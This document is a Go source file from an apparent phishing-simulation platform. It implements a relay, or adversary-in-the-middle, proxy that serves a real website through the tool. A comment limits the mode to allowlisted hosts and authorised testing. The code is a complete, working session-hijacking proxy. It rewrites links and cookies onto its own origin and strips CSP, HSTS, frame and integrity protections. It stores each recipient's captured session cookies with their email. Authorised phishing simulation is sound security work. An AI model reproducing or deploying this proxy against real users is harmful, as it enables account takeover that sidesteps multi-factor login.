package api

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"

	"github.com/kurobeats/trawlarr/internal/notify"
	"github.com/kurobeats/trawlarr/internal/store"
)

// Relay campaigns (sometimes called AiTM or reverse-proxy mode) serve a live
// site through Trawlarr so the session cookies it issues can be captured.
//
// This is powerful and easy to misuse: it stays disabled unless proxy_enabled
// is set in config.json, and every upstream host must appear in
// proxy_allowlist. Only target sites you are authorised to test.

const proxyPrefix = "/px/"

// proxyJars keeps per-recipient upstream cookies in memory.
type proxyJars struct {
	mu sync.Mutex
	m  map[string]map[string]string
}

func newProxyJars() *proxyJars { return &proxyJars{m: map[string]map[string]string{}} }

func (j *proxyJars) get(key string) map[string]string {
	j.mu.Lock()
	defer j.mu.Unlock()
	if c, ok := j.m[key]; ok {
		out := make(map[string]string, len(c))
		for k, v := range c {
			out[k] = v
		}
		return out
	}
	return map[string]string{}
}

func (j *proxyJars) put(key string, cookies map[string]string) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.m[key] = cookies
}

var upstreamClient = &http.Client{
	Timeout: 30 * time.Second,
	// Redirects are returned to the browser so Location can be rewritten.
	CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
}

// handleProxyRelay serves /px/<rid>/<path> for relay campaigns.
func (s *Server) handleProxyRelay(w http.ResponseWriter, r *http.Request) {
	if !s.Cfg.ProxyEnabled {
		serveNotFound(w)
		return
	}
	rest := strings.TrimPrefix(r.URL.EscapedPath(), proxyPrefix)
	rid, upstreamPath, _ := strings.Cut(rest, "/")
	if rid == "" {
		serveNotFound(w)
		return
	}
	t, c, err := s.Store.TargetByRID(rid)
	if err != nil || c.ProxyURL == "" {
		serveNotFound(w)
		return
	}
	s.relay(w, r, t, c, upstreamPath)
}

func (s *Server) relay(w http.ResponseWriter, r *http.Request, t *store.CampaignTarget, c *store.Campaign, upstreamPath string) {
	base, err := url.Parse(c.ProxyURL)
	if err != nil || base.Scheme != "https" || !s.Cfg.ProxyHostAllowed(base.Hostname()) {
		s.Log.Warn("relay target denied", "campaign", c.ID, "upstream", c.ProxyURL)
		serveNotFound(w)
		return
	}
	if !s.limiter.allow("relay:"+s.clientIP(r), 600, time.Minute) {
		http.Error(w, "too many requests", http.StatusTooManyRequests)
		return
	}

	key := t.RID + "|" + base.Host
	jars := s.proxyJar.get(key)
	if len(jars) == 0 {
		// Fall back to a persisted jar after a restart.
		if saved, err := s.Store.ProxySession(t.RID, base.Host); err == nil {
			jars = saved
			s.proxyJar.put(key, jars)
		}
	}

	target := *base
	target.Path = strings.TrimSuffix(base.Path, "/") + "/" + upstreamPath
	target.RawPath = ""
	// Keep the caller's query string, dropping nothing: forms and OAuth
	// callbacks rely on it.
	target.RawQuery = r.URL.RawQuery

	var body io.Reader = r.Body
	req, err := http.NewRequestWithContext(r.Context(), r.Method, target.String(), body)
	if err != nil {
		serveNotFound(w)
		return
	}
	for name, values := range r.Header {
		switch strings.ToLower(name) {
		case "host", "cookie", "connection", "content-length", "accept-encoding", "x-forwarded-for", "x-forwarded-host", "x-forwarded-proto":
			continue
		}
		for _, v := range values {
			req.Header.Add(name, v)
		}
	}
	req.Header.Set("Accept-Encoding", "identity")
	req.Host = target.Host
	req.Header.Set("X-Forwarded-For", s.clientIP(r))
	req.Header.Set("X-Forwarded-Proto", "https")
	if len(jars) > 0 {
		parts := make([]string, 0, len(jars))
		for k, v := range jars {
			parts = append(parts, k+"="+v)
		}
		req.Header.Set("Cookie", strings.Join(parts, "; "))
	}

	resp, err := upstreamClient.Do(req)
	if err != nil {
		s.Log.Warn("relay upstream failed", "campaign", c.ID, "err", err)
		serveNotFound(w)
		return
	}
	defer resp.Body.Close()

	// Merge cookies from the upstream response into the jar.
	changed := false
	for _, sc := range resp.Header.Values("Set-Cookie") {
		name, value, keep := parseSetCookie(sc)
		if name == "" {
			continue
		}
		if !keep {
			if _, exists := jars[name]; exists {
				delete(jars, name)
				changed = true
			}
			continue
		}
		if jars[name] != value {
			jars[name] = value
			changed = true
		}
	}
	if changed {
		s.proxyJar.put(key, jars)
		if c.CaptureCookies {
			if err := s.Store.SaveProxySession(c.ID, t.RID, t.Email, base.Host, jars); err != nil {
				s.Log.Warn("store relay session", "err", err)
			}
			s.record(t, c, store.EvSessionCaptured, "Session cookies captured from "+base.Host, r, nil, false)
			s.Hub.Emit(c.OrgID, notify.Payload{
				Event: store.EvSessionCaptured, CampaignID: c.ID, Campaign: c.Name,
				Recipient: t.Email, RID: t.RID, Message: base.Host, At: time.Now().UTC(),
			})
		}
	}

	// Response headers: keep the useful ones, drop anything that pins the
	// browser to the real origin.
	for name, values := range resp.Header {
		switch strings.ToLower(name) {
		case "set-cookie", "content-length", "content-encoding", "transfer-encoding",
			"content-security-policy", "content-security-policy-report-only", "x-frame-options",
			"strict-transport-security", "cross-origin-opener-policy", "cross-origin-embedder-policy",
			"cross-origin-resource-policy", "report-to", "nel", "location", "connection":
			continue
		}
		for _, v := range values {
			w.Header().Add(name, v)
		}
	}
	for _, sc := range resp.Header.Values("Set-Cookie") {
		w.Header().Add("Set-Cookie", rewriteSetCookie(sc))
	}
	if loc := resp.Header.Get("Location"); loc != "" {
		w.Header().Set("Location", s.rewriteURL(loc, base, t.RID))
	}

	contentType := resp.Header.Get("Content-Type")
	if strings.Contains(contentType, "text/html") {
		raw, err := io.ReadAll(io.LimitReader(resp.Body, 12<<20))
		if err != nil {
			serveNotFound(w)
			return
		}
		w.Header().Set("Content-Type", contentType)
		w.WriteHeader(resp.StatusCode)
		w.Write(rewriteLinks(raw, base, t.RID))
		return
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, io.LimitReader(resp.Body, 32<<20))
}

// rewriteURL maps an upstream absolute/relative URL onto our relay prefix.
func (s *Server) rewriteURL(raw string, base *url.URL, rid string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	if u.Host != "" && !strings.EqualFold(u.Host, base.Host) {
		return raw // third-party: leave it alone
	}
	if u.Host == "" && !strings.HasPrefix(u.Path, "/") {
		return raw
	}
	out := proxyPrefix + rid + u.EscapedPath()
	if u.RawQuery != "" {
		out += "?" + u.RawQuery
	}
	if u.Fragment != "" {
		out += "#" + u.Fragment
	}
	return out
}

// rewriteLinks points every same-origin reference back through the relay.
func rewriteLinks(html []byte, base *url.URL, rid string) []byte {
	doc, err := goquery.NewDocumentFromReader(bytes.NewReader(html))
	if err != nil {
		return html
	}
	prefix := proxyPrefix + rid
	rewrite := func(_ int, el *goquery.Selection, attr string) {
		v, ok := el.Attr(attr)
		if !ok || v == "" || strings.HasPrefix(v, "#") || strings.HasPrefix(v, "data:") ||
			strings.HasPrefix(v, "javascript:") || strings.HasPrefix(v, "mailto:") {
			return
		}
		u, err := url.Parse(v)
		if err != nil {
			return
		}
		switch {
		case u.Host != "" && (strings.EqualFold(u.Host, base.Host) || strings.EqualFold(u.Host, "")):
			el.SetAttr(attr, prefix+u.EscapedPath()+querySuffix(u))
		case u.Host == "" && strings.HasPrefix(u.Path, "/"):
			el.SetAttr(attr, prefix+u.EscapedPath()+querySuffix(u))
		}
	}
	doc.Find("a[href]").Each(func(i int, el *goquery.Selection) { rewrite(i, el, "href") })
	doc.Find("form[action]").Each(func(i int, el *goquery.Selection) { rewrite(i, el, "action") })
	doc.Find("[src]").Each(func(i int, el *goquery.Selection) { rewrite(i, el, "src") })
	doc.Find("[data-src]").Each(func(i int, el *goquery.Selection) { rewrite(i, el, "data-src") })
	doc.Find("[integrity]").RemoveAttr("integrity")
	doc.Find("[crossorigin]").RemoveAttr("crossorigin")
	doc.Find(`meta[http-equiv]`).Each(func(_ int, el *goquery.Selection) {
		if v, _ := el.Attr("http-equiv"); strings.Contains(strings.ToLower(v), "content-security-policy") {
			el.Remove()
		}
	})
	doc.Find("base").Remove()
	var buf bytes.Buffer
	if err := goquery.Render(&buf, doc.Selection); err != nil {
		return html
	}
	return buf.Bytes()
}

func querySuffix(u *url.URL) string {
	if u.RawQuery == "" {
		return ""
	}
	return "?" + u.RawQuery
}

// parseSetCookie returns the cookie name/value and whether it should be kept.
func parseSetCookie(raw string) (name, value string, keep bool) {
	parts := strings.Split(raw, ";")
	first := strings.TrimSpace(parts[0])
	eq := strings.Index(first, "=")
	if eq <= 0 {
		return "", "", false
	}
	name = strings.TrimSpace(first[:eq])
	value = strings.TrimSpace(first[eq+1:])
	if name == "" || len(name) > 256 || len(value) > 8192 {
		return "", "", false
	}
	if strings.ContainsAny(name, " ;,\r\n") {
		return "", "", false
	}
	keep = true
	for _, attr := range parts[1:] {
		a := strings.ToLower(strings.TrimSpace(attr))
		if a == "max-age=0" || strings.HasPrefix(a, "max-age=-") || strings.HasPrefix(a, "expires=thu, 01 jan 1970") {
			keep = false
		}
	}
	return name, value, keep
}

// rewriteSetCookie rebinds an upstream cookie to our origin.
func rewriteSetCookie(raw string) string {
	parts := strings.Split(raw, ";")
	out := []string{strings.TrimSpace(parts[0]), "Path=/"}
	for _, attr := range parts[1:] {
		a := strings.TrimSpace(attr)
		lower := strings.ToLower(a)
		switch {
		case a == "":
			continue
		case strings.HasPrefix(lower, "domain="):
			continue // ours, not theirs
		case strings.HasPrefix(lower, "path="):
			continue
		case strings.HasPrefix(lower, "samesite="):
			out = append(out, "SameSite=None")
			continue
		default:
			out = append(out, a)
		}
	}
	return strings.Join(out, "; ")
}
